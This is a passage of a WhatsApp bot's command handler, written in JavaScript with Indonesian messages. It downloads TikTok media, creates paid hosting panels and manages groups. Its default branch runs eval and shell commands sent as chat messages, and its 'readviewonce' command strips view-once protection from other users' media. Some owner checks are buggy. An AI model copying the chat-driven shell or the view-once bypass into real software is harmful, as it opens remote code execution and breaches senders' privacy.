                data.push({ type: 'photo', url: v });
            });
        } else {
            data.push(
                { type: 'watermark', url: 'https://www.tikwm.com' + res?.wmplay || "/undefined" },
                { type: 'nowatermark', url: 'https://www.tikwm.com' + res?.play || "/undefined" },
                { type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res?.hdplay || "/undefined" }
            );
        }
        
        // Format result
        let result = {
            status: true,
            title: res.title,
            taken_at: formatDate(res.create_time).replace('1970', ''),
            region: res.region,
            id: res.id,
            durations: res.duration,
            duration: res.duration + ' Seconds',
            cover: 'https://www.tikwm.com' + res.cover,
            size_wm: res.wm_size,
            size_nowm: res.size,
            size_nowm_hd: res.hd_size,
            data: data,
            music_info: {
                id: res.music_info.id,
                title: res.music_info.title,
                author: res.music_info.author,
                album: res.music_info.album ? res.music_info.album : null,
                url: 'https://www.tikwm.com' + res.music || res.music_info.play
            },
            stats: {
                views: formatNumber(res.play_count),
                likes: formatNumber(res.digg_count),
                comment: formatNumber(res.comment_count),
                share: formatNumber(res.share_count),
                download: formatNumber(res.download_count)
            },
            author: {
                id: res.author.id,
                fullname: res.author.unique_id,
                nickname: res.author.nickname,
                avatar: 'https://www.tikwm.com' + res.author.avatar
            }
        };
        
        // Kirim result
        if (result.durations == 0 && result.duration == "0 Seconds") {
            let araara = [];
            let urutan = 0;
            
            for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                    image: { url: `${a.url}` }
                }, { upload: exxxa.waUploadToServer });
                
                araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `Foto Slide Ke *${urutan += 1}*`,
                        hasMediaAttachment: true,
                        ...imgsc
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    })
                });
            }
            
            const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: "*TIKTOK - DOWNLOADER*"
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: araara
                            })
                        })
                    }
                }
            }, {
                userJid: m.sender,
                quoted: m
            });
            
            await naze.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
            });
            
        } else {
            let urlVid = result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
            
            await naze.sendMessage(m.chat, {
    video: { url: urlVid.url },
    caption: momok,
    footer: "-#./exxxa",
    buttons: [
{
    buttonId: `.toaudio ${urlVid.url}`,
    buttonText: { displayText: "? To Audio" },
    type: 1
}
],
headerType: 5,
    viewOnce: true
}, { quoted: m })
        }
        
    } catch (e) {
        console.log(e);
        XksaaPly("Terjadi kesalahan!");
    }
    
    await naze.sendMessage(m.chat, { react: { text: "?", key: m.key } });
}
break;

case "rvo": case "readviewonce": {
if (!m.quoted) return XksaaPly("reply pesan viewOnce nya!")
let msg = m?.quoted?.message?.imageMessage || m?.quoted?.message?.videoMessage || m?.quoted?.message?.audioMessage || m?.quoted
if (!msg.viewOnce && m.quoted.mtype !== "viewOnceMessageV2" && !msg.viewOnce) return XksaaPly("Pesan itu bukan viewonce!")
const { downloadContentFromMessage } = require("@whiskeysockets/baileys");
let media = await downloadContentFromMessage(msg, msg.mimetype == 'image/jpeg' ? 'image' : msg.mimetype == 'video/mp4' ? 'video' : 'audio')
    let type = msg.mimetype
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return naze.sendMessage(m.chat, {video: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return naze.sendMessage(m.chat, {image: buffer, caption: msg.caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return naze.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) return XksaaPly(`Balas sticker dengan caption *${prefix + command}*`)
let media = await exxxa.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
naze.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}

break 

case 'toaudio': {
const url = args[0]
if (!url) return XksaaPly("URL tidak ditemukan!")

await naze.sendMessage(m.chat, {
audio: { url },
mimetype: 'audio/mpeg',
ptt: false
}, { quoted: m })

}
break

case "join": {
try {
if (!isCreator) return XksaaPly("*Your Not Owner*")
const quoted = m.quoted
let text = args.join(" ")
if (!text && quoted) {
    text = quoted.text || quoted.caption || ""
}
if (!text) return XksaaPly("Masukkan link group!")
if (!text.includes("chat.whatsapp.com"))
    return XksaaPly("Itu bukan link group WhatsApp!")
let link = text.split("https://chat.whatsapp.com/")[1]
if (!link) return XksaaPly("Link tidak valid!")
let code = link.split("?")[0].trim()
await exxxa.groupAcceptInvite(code)
XksaaPly("? Berhasil masuk group!")
} catch (err) {
console.log(err)
XksaaPly("? Gagal join group atau link tidak aktif!")
}
}
break

case "out":
case "leave": {
try {
if (!CreatorOnly) return CreatorOnly("*Your Not Owner*")
if (!m.isGroup) return XksaaPly("Command ini hanya bisa digunakan di dalam group!")
await XksaaPly("? Bot akan keluar dari group ini...")
await exxxa.groupLeave(m.chat)
} catch (err) {
console.log(err)
XksaaPly("? Gagal keluar dari group!")
}
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
  try {
    if (!CreatorOnly) return XksaaPly("lu siapa idiot, nih buat owner")
    if (!text) return XksaaPly(example("username"))
    global.panel = text

    var ram, disknya, cpu
    if (command == "1gb") { ram="1000"; disknya="1000"; cpu="40" }
    else if (command == "2gb") { ram="2000"; disknya="1000"; cpu="60" }
    else if (command == "3gb") { ram="3000"; disknya="2000"; cpu="80" }
    else if (command == "4gb") { ram="4000"; disknya="2000"; cpu="100" }
    else if (command == "5gb") { ram="5000"; disknya="3000"; cpu="120" }
    else if (command == "6gb") { ram="6000"; disknya="3000"; cpu="140" }
    else if (command == "7gb") { ram="7000"; disknya="4000"; cpu="160" }
    else if (command == "8gb") { ram="8000"; disknya="4000"; cpu="180" }
    else if (command == "9gb") { ram="9000"; disknya="5000"; cpu="200" }
    else if (command == "10gb") { ram="10000"; disknya="5000"; cpu="220" }
    else { ram="0"; disknya="0"; cpu="0" }

    let username = global.panel.toLowerCase() + crypto.randomBytes(2).toString('hex')
    let email = username+"@gmail.com"
    let name = username + " Server"
    let password = username+crypto.randomBytes(2).toString('hex')

    let f = await fetch(domain + "/api/application/users", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "email": email,
        "username": username,
        "first_name": name,
        "last_name": "Server",
        "language": "en",
        "password": password
      })
    })
    let data = await f.json();
    if (data.errors) return XksaaPly(JSON.stringify(data.errors[0], null, 2))

    let user = data.attributes
    let desc = tanggal(Date.now())
    let usr_id = user.id

    let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
      "method": "GET",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey}
    })
    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup

    let f2 = await fetch(domain + "/api/application/servers", {
      "method": "POST",
      "headers": {"Accept": "application/json","Content-Type": "application/json","Authorization": "Bearer " + apikey},
      "body": JSON.stringify({
        "name": name,
        "description": desc,
        "user": usr_id,
        "egg": parseInt(egg),
        "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
        "startup": startup_cmd,
        "environment": {"INST":"npm","USER_UPLOAD":"0","AUTO_UPDATE":"0","CMD_RUN":"npm start"},
        "limits": {"memory": ram,"swap": 0,"disk": disknya,"io": 500,"cpu": cpu},
        "feature_limits": {"databases": 5,"backups": 5,"allocations": 5},
        deploy: {locations: [parseInt(loc)],dedicated_ip: false,port_range: []}
      })
    })
    let result = await f2.json()
    if (result.errors) return XksaaPly(JSON.stringify(result.errors[0], null, 2))

    let server = result.attributes

    var orang = m.isGroup ? m.sender : m.chat
    if (m.isGroup) await XksaaPly("*? Berhasil membuat panel!*\nData sudah dikirim ke private chat")

    var teks = `*? Berhasil Membuat Panel Kamu!*

? *ID Server:* ${server.id}
? *Username:* ${user.username}
? *Password:* ${password}

? *Spesifikasi:*
? RAM: ${ram=="0"?"Unlimited":ram/1000+"GB"}
? Disk: ${disknya=="0"?"Unlimited":disknya/1000+"GB"}
? CPU: ${cpu=="0"?"Unlimited":cpu+"%"}

? ${global.domain}

?? *Syarat & Ketentuan:*
- Expired 1 bulan
- Garansi 15 hari (1x replace)
- Claim garansi wajib bawa bukti chat pembelian
`

    // Kirim pakai nativeFlowMessage
    let msgii = await generateWAMessageFromContent(orang, {
      viewOnceMessage: {
        message: {
          messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: { mentionedJid: [m.sender] },
            body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [
                {"name":"cta_url","buttonParamsJson":`{"display_text":"? Login Server Panel","url":"${global.domain}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"? Copy Username","copy_code":"${user.username}"}`},
                {"name":"cta_copy","buttonParamsJson":`{"display_text":"? Copy Password","copy_code":"${password}"}`}
              ]
            })
          })
        }
      }
    }, { userJid: orang, quoted: m })

    await naze.relayMessage(orang, msgii.message, { messageId: msgii.key.id })
    delete global.panel

  } catch (e) {
    console.error(e)
    XksaaPly("? Terjadi error: " + e.message)
  }
}
break

case "cekidch":
        case "idch": {
            if (!text) return XksaaPly(example("linkchnya"))
            if (!text.includes("https://whatsapp.com/channel/")) return XksaaPly("Link tautan tidak valid")
            let result = text.split('https://whatsapp.com/channel/')[1]
            let res = await exxxa.newsletterMetadata("invite", result)
            let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
            let msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [{
                                    "name": "cta_copy",
                                    "buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
                                }]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m })
            await naze.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
            })
        }
        break;
//=======================\\
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return XksaaPly(bang)}
try {
XksaaPly(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
XksaaPly(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await XksaaPly(evaled)
} catch (err) {
await XksaaPly(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return XksaaPly(`${err}`)
if (stdout) return XksaaPly(stdout)
})
}
//========================================================\\
}
} catch (err) {
naze.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\